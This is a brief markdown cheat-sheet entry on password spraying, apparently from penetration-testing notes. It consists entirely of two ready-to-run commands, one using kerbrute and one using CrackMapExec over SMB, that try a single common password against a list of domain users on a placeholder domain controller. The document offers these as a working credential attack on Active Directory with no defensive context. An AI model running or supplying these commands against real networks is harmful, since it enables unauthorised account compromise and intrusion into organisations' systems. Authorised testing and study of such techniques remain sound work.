# Password Spraying

```bash
# Using kerbrute
./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123

# Using CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
```